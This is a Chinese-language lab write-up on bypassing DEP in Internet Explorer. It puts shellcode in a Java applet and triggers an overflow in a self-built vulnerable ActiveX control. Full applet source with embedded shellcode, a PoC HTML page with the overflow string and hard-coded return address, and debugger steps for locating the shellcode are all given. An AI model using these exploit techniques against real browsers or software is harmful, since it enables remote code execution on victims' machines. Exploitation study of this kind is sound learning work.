###   利用Java applet挑战DEP 

####   Java applet 可以被加載到瀏覽器，而該記憶體頁面是可以執行的。

###   先下載 JDK 1.4.2。
[j2sdk-1_4_2_03-windows-i586-p-iftw.exe](http://wilab.inha.ac.kr/ivj/needdownload.html)


不過我不確定這版本是不是對的，因為跟作者的實驗出來的有一些差距  


####   條件
具有溢出漏洞的ActiveX控件
包含有shellcode的Java applet
可以觸發ActiveX控件中漏洞的PoC頁面
建立ActiveX的過程與之前，完全一致，不再多說。下面來建立applet：



###  用編輯器把儲存文件名為:Shellcode.Java (很重要，名子是跟著那個 public class Shellcode 所以要一致)
```
import java.applet.*;
import java.awt.*;

public class Shellcode extends Applet {
		public void init(){
			  Runtime.getRuntime().gc();
				StringBuffer buffer=new StringBuffer(255);
				buffer.append("\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
                             "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
                             "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
                             "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
                             "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
                             "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
                             "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
                             "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
                             "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
                             "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
                             "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
                             "\uff53\ufc57\uff53\uf857");
		}
}
```


###  找到 javac 工具 執行指令(要根據自己的路徑) 產生 class 檔
```
javac Shellcode.java -target 1.1
```
![enter image description here](https://i.imgur.com/qDT0NR1.png)




###  建立POC .html  (可能每個人的 shellcode 起始位置不一樣需要自行調整)
```
<html>  
<body>  
  <applet code=Shellcode.class width=300 height=50></applet>
  <script>alert("begin");</script>
  <object classid="clsid:39F64D5B-74E8-482F-95F4-918E54B1B2C8" id="test"></object>  
  <script>
    var s = "\u9090";
    while (s.length < 54) {
        s += "\u9090";
    }
    s +="\u7804\u145a"; 
    test.test(s); 
  </script>  
</body>  
</html>
```


### 注意事項
#### 1 Shellcode.class 和 poc.html 和 VulnerAX.ocx 放在同一個資料夾底下

#### 2.之前產生的漏洞控件 VulnerAX.ocx 如果你移動到其他資料夾底下，還要再重新註冊一次 ( 不然會出現指令碼錯誤 )

![enter image description here](https://i.imgur.com/9f8qCJr.png)




####  等等使用 immunity debugger 的 (mona.py插件) 搜尋比對 shellcode 的插件功能(因為在browser 的記憶體很亂，而且可能並不固定)
----
1.需要先建立一個 shellcode.bin 檔案(名子可以隨便取不要跟前面的Shellcode.class搞混就行)， 使用線上 x86 assembler 網站，把\x格式轉成 raw

[defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly2)

2.再用 HxD 編輯器把 raw 存成 bin 

![enter image description here](https://i.imgur.com/wzvis50.png)


3.IE 打開 poc.html 會談出begin 對話框(先別關閉)

![enter image description here](https://i.imgur.com/GJUL2CA.png)



4.然後用  Immunity debugger attach  IE 並在下方輸入比對指令
如果有出現紅色 Hooray 就是代表找到了
這邊找到了 兩個 0x145a7804 跟 0x100d04fc

![enter image description here](https://i.imgur.com/F7vXXKM.png)



5.作者說其中一個固定，一個會隨機跳動，但我這裡是兩個都會跳動，但我比對很多次發現它們跳動是有規律的。而且 0x145a7804  出現的機率比較高。所以使用這個位置。
(你有可能試個幾次就會成功，果然寫死位置的缺點就是不穩定)。 
 

![enter image description here](https://i.imgur.com/QbOqOwn.png)



----
### 後記可能之後會使用 Egg hunt 的方式來尋找shellcode 之前在一本書看到過，聽說瀏覽器的環境很多位置都是不固定的。很適合用這個方式。
